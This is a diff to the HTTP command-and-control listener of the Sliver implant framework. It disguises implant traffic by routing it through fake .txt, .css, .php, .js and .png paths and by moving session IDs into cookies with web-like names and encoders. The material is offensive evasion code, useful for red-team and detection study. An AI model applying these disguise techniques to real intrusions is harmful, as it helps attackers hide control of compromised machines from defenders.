@@ -16,6 +16,7 @@ import (
 	"sliver/server/certs"
 	"sliver/server/core"
 	"sliver/server/cryptography"
+	"sliver/server/encoders"
 	"sync"
 	"time"
 
@@ -29,6 +30,13 @@ import (
 const (
 	defaultHTTPTimeout = time.Second * 60
 	pollTimeout        = defaultHTTPTimeout - 5
+)
+
+var (
+	cookieEncoders = map[string]encoders.ASCIIEncoder{
+		"JSESSIONID": encoders.Hex{},
+		"SESSIONID":  encoders.Base64{},
+	}
 )
 
 // HTTPSession - Holds data related to a sliver c2 session
@@ -153,12 +161,18 @@ func StartHTTPListener(conf *HTTPServerConfig) *SliverHTTPC2 {
 func (s *SliverHTTPC2) router() *mux.Router {
 	router := mux.NewRouter()
 
-	// This is a *functional* implementation, we'll obfuscate later
-	router.HandleFunc("/rsakey", s.rsaKeyHandler).Methods("GET")
-	router.HandleFunc("/start", s.startSessionHandler).Methods("POST")
-	router.HandleFunc("/session", s.sessionHandler).Methods("POST")
-	router.HandleFunc("/poll", s.pollHandler).Methods("GET")
-	router.HandleFunc("/stop", s.stopHandler).Methods("POST")
+	// Procedural C2
+	// ===============
+	// .txt = rsakey
+	// .css = start
+	// .php = session
+	//  .js = poll
+	// .png = stop
+	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).Methods("GET")
+	router.HandleFunc("/{rpath:.*\\.css$}", s.startSessionHandler).Methods("GET", "POST")
+	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).Methods("GET", "POST")
+	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).Methods("GET")
+	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).Methods("GET")
 
 	router.Use(loggingMiddleware)
 
@@ -173,9 +187,7 @@ func loggingMiddleware(next http.Handler) http.Handler {
 }
 
 // [ HTTP Handlers ] ---------------------------------------------------------------
-// This initial implementation is designed to be functional and reliable, it has not
-// been optimized for speed or stealth at this point. It contains little obfuscation
-// ---------------------------------------------------------------------------------
+
 func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
 	rootDir := assets.GetRootAppDir()
 	certPEM, _, _ := certs.GetServerRSACertificatePEM(rootDir, "slivers", s.Conf.Domain, true)
@@ -226,12 +238,20 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 		resp.WriteHeader(404)
 		return
 	}
+	// encoderName, encodedData := s.cookieEncoder(data)
+	http.SetCookie(resp, &http.Cookie{
+		Domain:   s.Conf.Domain,
+		Name:     "sessionid",
+		Value:    session.ID,
+		Secure:   true,
+		HttpOnly: true,
+	})
 	resp.Write(data)
 }
 
 func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
 
-	sessionID := req.URL.Query().Get("sessionid")
+	sessionID := s.getSessionID(req)
 	session := s.Sessions.Get(sessionID)
 	if session == nil {
 		log.Printf("[http] No session with id %#v", sessionID)
@@ -256,8 +276,8 @@ func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Reques
 
 	handlers := sliverHandlers.GetSliverHandlers()
 	if envelope.ID != 0 {
-		session.Sliver.RespMutex.Lock()
-		defer session.Sliver.RespMutex.Unlock()
+		session.Sliver.RespMutex.RLock()
+		defer session.Sliver.RespMutex.RUnlock()
 		if resp, ok := session.Sliver.Resp[envelope.ID]; ok {
 			resp <- envelope
 		}
@@ -269,7 +289,7 @@ func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Reques
 }
 
 func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
-	sessionID := req.URL.Query().Get("sessionid")
+	sessionID := s.getSessionID(req)
 	session := s.Sessions.Get(sessionID)
 	if session == nil {
 		log.Printf("[http] No session with id %#v", sessionID)
@@ -291,7 +311,7 @@ func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) 
 }
 
 func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) {
-	sessionID := req.URL.Query().Get("sessionid")
+	sessionID := s.getSessionID(req)
 	session := s.Sessions.Get(sessionID)
 	if session == nil {
 		log.Printf("[http] No session with id %#v", sessionID)
@@ -320,6 +340,28 @@ func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) 
 	s.Sessions.Remove(session.ID)
 
 	resp.WriteHeader(200)
+}
+
+func (s *SliverHTTPC2) getSessionID(req *http.Request) string {
+	for _, cookie := range req.Cookies() {
+		log.Printf("[http] Cookie: %#v", cookie)
+		if cookie.Name == "sessionid" {
+			return cookie.Value
+		}
+	}
+	return "" // No valid cookie names
+}
+
+func (s *SliverHTTPC2) cookieEncoder(data []byte) (string, string) {
+	name, encoder := randomCookieEncoder()
+	return name, encoder.Encode(data)
+}
+
+func randomCookieEncoder() (string, encoders.ASCIIEncoder) {
+	for k, v := range cookieEncoders {
+		return k, v
+	}
+	return "", nil
 }
 
 func newSession() *HTTPSession {
